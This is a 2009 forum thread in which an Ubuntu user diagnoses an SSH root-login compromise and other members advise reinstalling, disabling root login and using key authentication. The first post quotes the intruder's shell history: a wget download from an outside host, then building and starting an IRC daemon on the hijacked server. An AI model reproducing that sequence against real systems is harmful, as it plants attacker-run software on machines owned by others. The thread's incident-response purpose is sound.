---
title: "Securty Breach in 8.10"
date: 2009-04-20
forum: Security
---

### Post by bperucchi on 2009-04-20
Hi Guy.


I'm using Ubuntu 8.10 by 2 months and in the 2 months my system already has 2 breach security. 

I detect the intrusion running the command "last" and appear the IP number that not correspond with my network.After that I found 2 hidden directory in /root

Now I the day 18 on April I seen that I was hacked for the second time. 

I use the chkroot to analyses to security vulnerability. 

What I could to use or do to increase the security on the system ?  

The directory was hacked 

drwxr-xr-x 13 smbguest nobody    4096 2009-04-18 14:54 Unreal3.2

Command LAST
root     pts/1        77.29.72.163     Sat Apr 18 14:43 - 14:50  (00:06)    
root     pts/1        77.29.72.163     Sat Apr 18 14:31 - 14:43  (00:11)    
root     pts/1        77.29.72.163     Sat Apr 18 14:23 - 14:31  (00:07)  

The commands are using for the hacked
passwd
ls
up
uptime
wget [http://www.garantishell.com/Ozel/ircd.tar.gz](http://www.garantishell.com/Ozel/ircd.tar.gz)
tar zxvf ircd.tar.gz
cd Unreal3.2
./Config
where is tcl
tcl
apt-get
apt-get install tclx8.3
tcl
ls
ulimit -a
nano /usr/include/bits.typesizes.h
nano /usr/include/bits/typesizes.h
ulimit -n 10000
tar zxfv ircd.tar.gz
cd Unreal3.2
./Config
make
nano unrealircd.conf
./unreal start
nano unrealircd.conf
cd
exit



My iptables works in this away:
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP


This are the ports open in my system at localhost

This is the port I was running
Starting Nmap 4.62 ( [http://nmap.org](http://nmap.org) ) at 2009-04-20 01:38 BRT
Initiating SYN Stealth Scan at 01:38
Scanning localhost (127.0.0.1) [1715 ports]
Discovered open port 22/tcp on 127.0.0.1 (SSH)
Discovered open port 25/tcp on 127.0.0.1 (MAIL)
Discovered open port 3306/tcp on 127.0.0.1 (MYSQL)
Discovered open port 631/tcp on 127.0.0.1 (CUPS)
Discovered open port 111/tcp on 127.0.0.1 (RPCBIND)
Discovered open port 445/tcp on 127.0.0.1
Discovered open port 8080/tcp on 127.0.0.1
Discovered open port 139/tcp on 127.0.0.1
Completed SYN Stealth Scan at 01:38, 0.08s elapsed (1715 total ports)


IN MY EXTERNAL IP
SCRIPT ENGINE: Initiating script scanning.
Host 189.x.xx.xx appears to be up ... good.
Interesting ports on 189.x.xxx.xxx:
Not shown: 1712 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh         (protocol 2.0)
111/tcp  open  rpcbind
8080/tcp open  http-proxy nginx http proxy 0.6.35

---

### Post by ibuclaw on 2009-04-20
Do you perhaps have a vulnerable ssh key?
```
sudo ssh-vulnkey -a
```

Tell us if anything is outputted that seems serious.

[EDIT]
Also, are you needing access to your network from outside your LAN?

Regards
Iain

---

### Post by cdenley on 2009-04-20
Logging in remotely as root should not be possible. Did you set a root password? Post this output.
```

sudo getent shadow root|cut -d : -f 2|grep ^\!>/dev/null
echo $?

```
My guess is you set a root password (a weak one, too), and since you're running ssh, and probably used a default config that permits root login, it was only a matter of time until the root password was guessed, and someone had unlimited access to your system.

Also, once your system has been compromised, there is no way to know for sure what the attacker has done. I suggest reformatting your drive and reinstalling ubuntu.

---

### Post by bperucchi on 2009-04-20
> **tinivole said:**
> Do you perhaps have a vulnerable ssh key?
```
sudo ssh-vulnkey -a
```

Tell us if anything is outputted that seems serious.

[EDIT]
Also, are you needing access to your network from outside your LAN?

Regards
Iain

Yes, I need access my network from outsite.


sudo ssh-vulnkey -a
/etc/ssh/ssh_host_rsa_key:1: Unknown (blacklist file not installed): RSA 2048 88:fb:87:01:ab:a7:e4:9c:c2:df:7a:38:6f:d2:43:c5 /etc/ssh/ssh_host_rsa_key.pub
/etc/ssh/ssh_host_dsa_key:1: Unknown (blacklist file not installed): DSA 1024 b7:f8:a4:e9:70:39:82:5b:0d:9c:b1:08:33:fd:15:95 /etc/ssh/ssh_host_dsa_key.pub
/root/.ssh/authorized_keys:1: Unknown (blacklist file not installed): RSA 1024 dc:15:3f:2e:c5:c5:c5:51:51:67:f9:ae:3c:0a:36:89 root@ows-server
/dev/null/.ssh/id_rsa: Not a directory
/dev/null/.ssh/id_dsa: Not a directory
/dev/null/.ssh/identity: Not a directory
/dev/null/.ssh/authorized_keys: Not a directory
/dev/null/.ssh/authorized_keys2: Not a directory
/home/ows/.ssh/authorized_keys:1: Unknown (blacklist file not installed): RSA 1024 f8:9c:90:a8:d5:77:87:fb:e8:ea:0e:2b:e6:dd:0e:7a ows@ows-server

---

### Post by bperucchi on 2009-04-20
> **cdenley said:**
> Logging in remotely as root should not be possible. Did you set a root password? Post this output.
```

sudo getent shadow root|cut -d : -f 2|grep ^\!>/dev/null
echo $?

```
My guess is you set a root password (a weak one, too), and since you're running ssh, and probably used a default config that permits root login, it was only a matter of time until the root password was guessed, and someone had unlimited access to your system.

Also, once your system has been compromised, there is no way to know for sure what the attacker has done. I suggest reformatting your drive and reinstalling ubuntu.

root@ows-server:~# getent shadow root|cut -d : -f 2|grep ^\!>/dev/null
root@ows-server:~# echo $?
1

Yes, by default instalation the UBUNTU 8.10 the sshd is coming with defaul PermitRootLogin=Yes. Now I change the value to NO. 

But How the could get access if my root login if I had strong password?

---

### Post by cdenley on 2009-04-20
> **bperucchi said:**
> root@ows-server:~# getent shadow root|cut -d : -f 2|grep ^\!>/dev/null
root@ows-server:~# echo $?
1

Yes, by default instalation the UBUNTU 8.10 the sshd is coming with defaul PermitRootLogin=Yes. Now I change the value to NO. 

But How the could get access if my root login if I had strong password?

Probably because your root password is not as strong as you think. Ubuntu comes with root disabled for a reason, and that is why PermitRootLogin isn't set to "no" by default.

---

### Post by cdenley on 2009-04-20
> **bperucchi said:**
> Yes, I need access my network from outsite.


sudo ssh-vulnkey -a
/etc/ssh/ssh_host_rsa_key:1: Unknown (blacklist file not installed): RSA 2048 88:fb:87:01:ab:a7:e4:9c:c2:df:7a:38:6f:d2:43:c5 /etc/ssh/ssh_host_rsa_key.pub
/etc/ssh/ssh_host_dsa_key:1: Unknown (blacklist file not installed): DSA 1024 b7:f8:a4:e9:70:39:82:5b:0d:9c:b1:08:33:fd:15:95 /etc/ssh/ssh_host_dsa_key.pub
/root/.ssh/authorized_keys:1: Unknown (blacklist file not installed): RSA 1024 dc:15:3f:2e:c5:c5:c5:51:51:67:f9:ae:3c:0a:36:89 root@ows-server
/dev/null/.ssh/id_rsa: Not a directory
/dev/null/.ssh/id_dsa: Not a directory
/dev/null/.ssh/identity: Not a directory
/dev/null/.ssh/authorized_keys: Not a directory
/dev/null/.ssh/authorized_keys2: Not a directory
/home/ows/.ssh/authorized_keys:1: Unknown (blacklist file not installed): RSA 1024 f8:9c:90:a8:d5:77:87:fb:e8:ea:0e:2b:e6:dd:0e:7a ows@ows-server

That command might be more helpful if you install the blacklists.
```

sudo apt-get install openssh-blacklist

```

---

### Post by whoop on 2009-04-20
Are you using a key based authentication method (with username/password authentication disabled)? I see people writing about the blacklist, but what if it has nothing to do with keys.

---

### Post by cdenley on 2009-04-20
> **whoop said:**
> Are you using a key based authentication method (with username/password authentication disabled)? I see people writing about the blacklist, but what if it has nothing to do with keys.

It probably doesn't. I checked, and the key he has installed for root does not appear to be on the blacklist. According to the output he posted, and as he appears to indicate, he did set a root password.

---

### Post by whoop on 2009-04-20
> **cdenley said:**
> It probably doesn't. I checked, and the key he has installed for root does not appear to be on the blacklist. According to the output he posted, and as he appears to indicate, he did set a root password.

Well there's your problem;)

To harden the ssh service I recommend disabling root access, and disabling username/password authentication. Just use key based authentication.
Now that your system has been compromised I wouldn't use this install anymore as you can't really trust it.

It might be interesting to look at your authentication log and see how much attempts it took to get in (the file could of course have been changed afterwards).

---

### Post by ibuclaw on 2009-04-20
OK, lets look from this at a different angle then.

How long have you had port 111 open? It is being used by the portmap package.

It is probably a good idea to limit the scope of just what IP addresses can connect to your computer then.
For example: [http://www.redhat.com/docs/manuals/linux/RHL-9-Manual/security-guide/s1-server-port.html](http://www.redhat.com/docs/manuals/linux/RHL-9-Manual/security-guide/s1-server-port.html)


Or have a read through bodhi.zazen's wonderful iptables-primer and use it as a guide to secure down your already open ports: [http://bodhizazen.net/Tutorials/iptables/](http://bodhizazen.net/Tutorials/iptables/)

Regards
Iain

---

### Post by bperucchi on 2009-04-21
> **whoop said:**
> Well there's your problem;)

To harden the ssh service I recommend disabling root access, and disabling username/password authentication. Just use key based authentication.
Now that your system has been compromised I wouldn't use this install anymore as you can't really trust it.

It might be interesting to look at your authentication log and see how much attempts it took to get in (the file could of course have been changed afterwards).

I found the authentication log and the change the root password with this

Apr 18 14:22:52 ows-server passwd[9137]: pam_unix(passwd:chauthtok): password changed for root
Apr 18 14:23:27 ows-server sshd[9139]: Accepted password for root from 77.29.72.163 port 63394 ssh2
Apr 18 14:23:27 ows-server sshd[9139]: pam_unix(sshd:session): session opened for user root by (uid=0)
Apr 18 14:31:10 ows-server sshd[9139]: pam_unix(sshd:session): session closed for user root

This means anything?

---

### Post by cdenley on 2009-04-21
> **bperucchi said:**
> I found the authentication log and the change the root password with this

Apr 18 14:22:52 ows-server passwd[9137]: pam_unix(passwd:chauthtok): password changed for root
Apr 18 14:23:27 ows-server sshd[9139]: Accepted password for root from 77.29.72.163 port 63394 ssh2
Apr 18 14:23:27 ows-server sshd[9139]: pam_unix(sshd:session): session opened for user root by (uid=0)
Apr 18 14:31:10 ows-server sshd[9139]: pam_unix(sshd:session): session closed for user root

This means anything?

It looks like the root password was changed immediately before it was used for root access. Try posting the logged events immediately before that. I'm guessing there was something like
```

Apr 18 14:22:52 ows-server sudo:  bperucchi : TTY=pts/0 ; PWD=/home/bperucchi ; USER=root ; COMMAND=/usr/bin/passwd

```
They probably guessed your admin password, not your root password. Once they had admin shell access and your password, they had sudo access.

Also, try posting everything in auth.log from that IP.
```

zcat /var/log/auth.log.*.gz|grep -h 77.29.72.163 - /var/log/auth.log.0 /var/log/auth.log

```

---

### Post by bperucchi on 2009-04-21
> **cdenley said:**
> It looks like the root password was changed immediately before it was used for root access. Try posting the logged events immediately before that. I'm guessing there was something like
```

Apr 18 14:22:52 ows-server sudo:  bperucchi : TTY=pts/0 ; PWD=/home/bperucchi ; USER=root ; COMMAND=/usr/bin/passwd

```
They probably guessed your admin password, not your root password. Once they had admin shell access and your password, they had sudo access.

Also, try posting everything in auth.log from that IP.
```

zcat /var/log/auth.log.*.gz|grep -h 77.29.72.163 - /var/log/auth.log.0 /var/log/auth.log

```

I found this authetication in the auth.log

Apr 20 18:30:01 ows-server CRON[16084]: pam_unix(cron:session): session opened for user root by (uid=0)
Apr 20 18:33:12 ows-server groupadd[25235]: new group: name=sabayon-admin, GID=1004
Apr 20 18:33:12 ows-server useradd[25241]: new user: name=sabayon-admin, UID=1003, GID=1004, home=/var/run/sabayon-admin, shell=/bin/sh


Has several entries in the auth.log. What this is means?

Apr 20 18:30:01 ows-server CRON[16084]: pam_unix(cron:session): session opened for user root by (uid=0)



I already change the root password. 

This is the command zcat

Apr 18 14:23:27 ows-server sshd[9139]: Accepted password for root from 77.29.72.163 port 63394 ssh2
Apr 18 14:31:55 ows-server sshd[9398]: Accepted password for root from 77.29.72.163 port 61772 ssh2
Apr 18 14:43:55 ows-server sshd[9990]: Accepted password for root from 77.29.72.163 port 62171 ssh2

---

### Post by kpatz on 2009-04-21
Do this:

```
zcat /var/log/auth.log.*.gz >~/logs
```

Then open ~/logs in a text editor (vi, nano, gedit, etc.).  Search for that IP address, and then post the lines before and after the entries showing that IP (thus, showing the initial login, sudo access, and other things they did).

In any case, I suggest doing the following to secure your system:

1.  Back up anything important (e.g. /home) and then reformat and reinstall.
2.  When you reinstall, give your admin account a strong password.
3.  Install all updates, to get the latest security patches.
4.  Install openssh-server, but change it to disallow root logins and use key authentication only.  Also, change the port from 22 to something else, like 2020, to stop the script kiddie scanbots from finding it.  Or, use iptables to restrict access to 22 to only the IPs that you access the server from.  Do you ssh in from the internet, or only from your local LAN?  If only from the LAN, use iptables to block SSH from the internet completely.

That should make you safer than you were before.

---

### Post by cdenley on 2009-04-21
Apparently that IP only had 3 authentications as root. That is very strange, because they must have either had shell access and an admin password in order to set the root password, or they already had root, and simply set a password to give them easier access.

```

Apr 20 18:30:01 ows-server CRON[16084]: pam_unix(cron:session): session opened for user root by (uid=0)

```
This is normal, just a cron job running as root. I would still be interested in seeing auth.log entries before the root password was changed.

Post this entire output.
```

last -i|grep -v 192.168.

```

---

### Post by brian_p on 2009-04-21
> **bperucchi said:**
> 

I already change the root password. 

What was the original password? As you have said

> But How the could get access if my root login if I had strong password?

Knowing it would allow a judgement to be made.

---

### Post by bperucchi on 2009-04-21
> **cdenley said:**
> Apparently that IP only had 3 authentications as root. That is very strange, because they must have either had shell access and an admin password in order to set the root password, or they already had root, and simply set a password to give them easier access.

```

Apr 20 18:30:01 ows-server CRON[16084]: pam_unix(cron:session): session opened for user root by (uid=0)

```
This is normal, just a cron job running as root. I would still be interested in seeing auth.log entries before the root password was changed.

Post this entire output.
```

last -i|grep -v 192.168.

```

I don't know how could get to in at my server but I think that has something to do with Samba services.


I have only three machines in my network. My server x.1 and my notebook x.10 and wireless router x.11


root@ows-server:/var/log# last -i|grep 192.168.
oneweb   pts/1        192.168.1.10     Tue Apr 21 15:26 - 15:27  (00:00)    
oneweb   pts/3        192.168.1.10     Mon Apr 20 21:41 - 11:04  (13:22)

---

### Post by bperucchi on 2009-04-21
> **brian_p said:**
> What was the original password? As you have said



Knowing it would allow a judgement to be made.

No my password was the " 0paz.. "

Now I change this password!

---

### Post by bperucchi on 2009-04-21
> **kpatz said:**
> Do this:

```
zcat /var/log/auth.log.*.gz >~/logs
```

Then open ~/logs in a text editor (vi, nano, gedit, etc.).  Search for that IP address, and then post the lines before and after the entries showing that IP (thus, showing the initial login, sudo access, and other things they did).

In any case, I suggest doing the following to secure your system:

1.  Back up anything important (e.g. /home) and then reformat and reinstall.
2.  When you reinstall, give your admin account a strong password.
3.  Install all updates, to get the latest security patches.
4.  Install openssh-server, but change it to disallow root logins and use key authentication only.  Also, change the port from 22 to something else, like 2020, to stop the script kiddie scanbots from finding it.  Or, use iptables to restrict access to 22 to only the IPs that you access the server from.  Do you ssh in from the internet, or only from your local LAN?  If only from the LAN, use iptables to block SSH from the internet completely.

That should make you safer than you were before.

I only found the same entries that I had told

Apr 18 14:23:27 ows-server sshd[9139]: Accepted password for root from 77.29.72.163 port 63394 ssh2
Apr 18 14:31:55 ows-server sshd[9398]: Accepted password for root from 77.29.72.163 port 61772 ssh2
Apr 18 14:43:55 ows-server sshd[9990]: Accepted password for root from 77.29.72.163 port 62171 ssh2

---

### Post by brian_p on 2009-04-21
> **bperucchi said:**
> 

No my password was the " 0paz.. "

Not a very strong password. However, if someone had guessed it you would expect a record of all the attempts in the auth.log. They would have had to be lucky to get it first time. And yet you have (as you say in post #20) no such attempts from 77.29.72.163. Perplexing!

[quote]Now I change this password!

Very wise!

---

### Post by koenn on 2009-04-21
> **cdenley said:**
> It looks like the root password was changed immediately before it was used for root access. 
[CODE]


> **cdenley said:**
> Apparently that IP only had 3 authentications as root. That is very strange, because they must have either had shell access and an admin password in order to set the root password, or they already had root, and simply set a password to give them easier access.

My guess would be that they entered as root, reset the password (for ease of access or to shut the real root out, and had a few simultaneous sessions, eg to check if the password change was successful, to have a spare session in case one crashed,  or to run a number of programs simultaneously.

If you look at the command history in the op, you see the first command is simply 'passwd', suggesting root changes his own password. 
For an admin account to change root's password, he'd do 'sudo passwd root' and this wouldn't show up in root's history. 'su' from an other account would require the root passwd, not the user's password, even on ubuntu, I think.

In any case, whois shows the IP address belonging to a Macedonian ISP, and the attacker apparently wanted to run an IRC server on the compromised machine. 

@OP
Unless you want to preserve evidence to press charges, I'd reinstall the machine and be done with it, and take the advice offered in this thread re securing your ssh access, and leave the root account disabled. You probably brought this on yourself.

It would be interesting to see logs from before the initial successful login.

---

### Post by bperucchi on 2009-04-21
Folks,

I apreciate all the help however I will waiting at day 23 to download the new version of Ubuntu to reinstall the system and this time I will trying to do certain and fix the errors

Thanks

---

### Post by cariboo on 2009-04-21
If you are going to wait until the 23rd to download Jaunty, I would suggest you unplug the network cable until then.

Jim

---

### Post by wsonar on 2009-04-21
uhhuh  Nevermind

---

### Post by JK3mp on 2009-04-21
> **cdenley said:**
> It looks like the root password was changed immediately before it was used for root access. Try posting the logged events immediately before that. I'm guessing there was something like
```

Apr 18 14:22:52 ows-server sudo:  bperucchi : TTY=pts/0 ; PWD=/home/bperucchi ; USER=root ; COMMAND=/usr/bin/passwd

```
They probably guessed your admin password, not your root password. Once they had admin shell access and your password, they had sudo access.

Also, try posting everything in auth.log from that IP.
```

zcat /var/log/auth.log.*.gz|grep -h 77.29.72.163 - /var/log/auth.log.0 /var/log/auth.log

```

I second this. Doesn't matter how strong root is if your admin pass is week and has sudo chmod permissions. I also second Jims opinion. If you already have that interested an attacker on a small pier network then your best bet is to just shut it off if your gonna wait till the 23rd. (only 2 days from now though, u could make it, lol) Anywho... u sure they didn't get local access through your wireless router or your windows machine then peer into access on your linux box? anywho.. gl

---

### Post by bodhi.zazen on 2009-04-21
If you are going to run ssh, you need to secure it.

See : [AdvancedOpenSSH - Community Ubuntu Documentation]("https://help.ubuntu.com/community/AdvancedOpenSSH")

Then either add a few (simple ? ) rules in iptables or use denyhosts / fail2ban.

for ssh I advise : change the default port (port 22 gets hammered by script kiddies), use keys only + strong passwords, disallow root logins (log in then sudo -i).

[http://www.passwordmeter.com/](http://www.passwordmeter.com/)

---

### Post by jimv on 2009-04-22
The first thing you should do with your SSH server is change the port to something other than 22.  It's hard to hack an SSH server if you can't find it/don't know that it's an SSH server.  Also make sure that root logins are disabled, and setup key based authentication.  If you want to still use passwords to login, setup Fail2Ban, which will automatically ban IP addresses after a certain number of failed login attempts.

---

